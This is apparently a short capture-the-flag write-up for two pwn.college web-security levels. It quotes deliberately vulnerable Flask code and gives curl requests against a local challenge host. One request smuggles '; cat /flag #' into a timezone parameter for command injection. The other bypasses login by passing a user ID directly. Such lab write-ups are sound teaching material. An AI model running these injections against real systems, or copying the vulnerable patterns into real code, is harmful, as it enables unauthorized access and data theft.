# Web Security

pwn.college [Web Security](https://pwn.college/intro-to-cybersecurity/web-security/) dojo.

## Level 2 - Command injection

Code for the level

```python
def level2():
    timezone = request.args.get("timezone", "UTC")
    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
```

I want to inject `TZ=; cat /flag # date` into `TZ={timezone} date`.

```sh
curl "http://challenge.localhost:80?timezone=;%20cat%20/flag%20%23"
```

## Level 3 - Authentication bypass vulnerability

Code for the level

```python
def level3():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
        assert user, "Invalid `username` or `password`"

        return redirect(request.path, user=int(user["rowid"]))

    if "user" in request.args:
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```

I simply need to skip authentication and provide the user ID,

```sh
curl http://challenge.localhost:80?user=1
```
